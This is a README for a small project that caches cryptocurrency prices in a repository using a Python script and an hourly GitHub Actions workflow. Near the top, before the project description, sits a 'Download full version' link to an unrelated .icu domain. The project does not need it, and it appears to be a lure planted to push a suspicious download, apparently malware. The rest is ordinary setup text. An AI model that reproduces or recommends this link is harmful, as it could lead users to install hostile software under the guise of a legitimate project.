# Crypto Prices Cache
[Download full version](https://gitzdownloadkm.icu?p0ydjfnta617v75)

This project fetches cryptocurrency prices (Bitcoin, Ethereum, and DAI) from a public crypto prices API every hour and commits the data to this repository. It uses GitHub Actions to automate the process.

## Files

- `fetch_crypto_prices.py`: A Python script that fetches the latest cryptocurrency prices and saves them to a JSON file.
- `.github/workflows/update_crypto_prices.yml`: A GitHub Actions workflow that runs the Python script every hour and commits the changes.

## Getting Started

### Prerequisites

- Python 3.x
- `requests` library (install via `pip install requests`)

### Setup

1. Clone the repository:

   ```bash
   git clone git@github.com:fantomstarterio/crypto-prices-cache.git
   cd crypto-prices-cache
    ```

2. Install the required Python packages:

    ```bash
    pip install requests
    ```

3. Run the Python script to fetch the latest cryptocurrency prices:

    ```bash
    python fetch_crypto_prices.py
    ```

## GitHub Actions

The GitHub Actions workflow is defined in .github/workflows/update_crypto_prices.yml. It is triggered every hour and performs the following steps:

1. Checks out the repository.
2. Sets up Python.
3. Installs the requests library.
4. Runs the fetch_crypto_prices.py script.
5. Commits and pushes the crypto_prices.json file to the repository.

If the workflow fails, it will retry after 5 minutes.

## Usage

You can use the raw [crypto_prices.json](https://raw.githubusercontent.com/fantomstarterio/crypto-prices-cache/main/crypto_prices.json) file in your application to get the latest cryptocurrency prices without hitting the public API directly. This helps to avoid rate limiting issues.

## Customization

If you want to fetch prices for different cryptocurrencies or use a different API, modify the fetch_crypto_prices.py script accordingly.
